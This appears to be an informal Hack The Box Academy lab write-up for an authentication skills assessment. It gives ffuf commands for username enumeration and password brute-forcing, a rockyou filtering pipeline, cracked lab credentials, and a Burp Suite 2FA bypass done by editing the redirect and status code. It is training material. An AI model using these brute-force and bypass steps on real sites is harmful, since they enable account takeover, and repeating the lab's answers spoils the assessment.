---

---

# HTB Academy — Skills Assessment: Authentication

**Platform:** Hack The Box Academy

**Category:** Web Security / Authentication

**Difficulty:** Skills Assessment

**Target:** `154.57.164.78:37839`

!Screenshot 2026-10-29 051702.png

## Objective

Identify and exploit authentication vulnerabilities by combining techniques covered in the Authentication module to retrieve the flag.

!Screenshot 2026-10-24 064538.png

step 1: go the login page

and we use ffuf tool to enumeration the username & password

```jsx
 ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.78:37839/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=invalid" -fr "Unknown user"
```

- we find   `gladys,Gladys`

Step for Test: when i go to login page and put username and password

when i put user not existing, 

the response is .. 

 

!Screenshot 2026-10-29 071444.png

But when i enter an existing username, 

the response is ..

!Screenshot 2026-10-29 071642.png

```jsx
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt -u http://154.57.164.78:37839/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Unknown user"

```

!Screenshot 2026-10-24 065030.png

now we go Greate a new account  

username `test` , password `CyberSafe26A`

!Screenshot 2026-11-02 074855.png

now what. say with me what 😂, please don’t exicting

- now we well crack password user >> `gladys`

```jsx
grep -E '^[A-Za-z0-9]{12}$' /usr/share/wordlists/rockyou.txt \
  | grep -E '[0-9]' \
  | grep -E '[a-z]' \
  | grep -E '[A-Z]' \
  > rockyou-12-policy.txt
  
  
  
  
  
  
  -------------------------
  
   ffuf -w ./rockyou-12-policy.txt -u http://154.57.164.79:40517/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -t 200 -fr "Invalid credentials." -s
```

!Screenshot 2026-11-02 081911.png

then password >> `dWinaldasD13`

user >> `gladys`

!Screenshot 2026-11-02 082035.png

---

now we try **Bypass 2fa**

open Burpsuite and intercept the request

don’t forget do this

!Screenshot 2026-11-02 091538.png

change /2fa.php to >> /profile.php

change in response from 302 to 200 OK

then you find 

!Screenshot 2026-11-02 083239.png

and you can see the flag >> 

!Screenshot 2026-11-02 103449.png
